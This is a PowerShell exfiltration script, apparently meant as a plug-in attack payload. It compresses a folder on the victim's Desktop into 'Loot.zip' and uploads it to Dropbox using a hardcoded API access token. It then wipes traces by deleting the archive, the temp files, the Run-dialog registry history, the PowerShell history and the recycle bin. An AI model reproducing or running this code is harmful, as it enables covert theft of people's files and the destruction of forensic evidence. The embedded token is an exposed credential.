#Grabs everything from the selected directory and compresses it into a .zip file

$compress = @{
  Path = $env:USERPROFILE + "\Desktop\SysinternalsSuite"
  CompressionLevel = "Fastest"
  DestinationPath = $env:USERPROFILE + "\Desktop\Loot.zip"
}
Compress-Archive @compress

#Upload to Dropbox or other filesharing service [DROPBOX ACCESS TOKEN IS ONLY VALID FOR 4H]
function DropBox-Upload {

[CmdletBinding()]
param (
	
[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
[Alias("f")]
[string]$SourceFilePath
) 
$DropBoxAccessToken = "sl.BT53U2anrn6lUWJEe7FQ6Y8d2PXDm8ps66SOjWe2k8ltLqiNzTPhSF0I2HN7EFZGmPu8GG07Eq-xUUq4J0ic_xYjjNwuFBP7Y0I4irWWJmtin9AvJ0eiWGl2pPXQlg4xx7QHsBLAM9g4"
$outputFile = Split-Path $SourceFilePath -leaf
$TargetFilePath="/$outputFile"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $DropBoxAccessToken
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

$env:USERPROFILE + "\Desktop\Loot.zip" | DropBox-Upload

#delete all traces

#delay
Start-Sleep -Seconds 3

#delete created archive
Remove-Item -Path $env:USERPROFILE"\Desktop\Loot.zip"

#temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

#run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVErsion\Explorer\RunRMU /va /f

#powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath

#recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
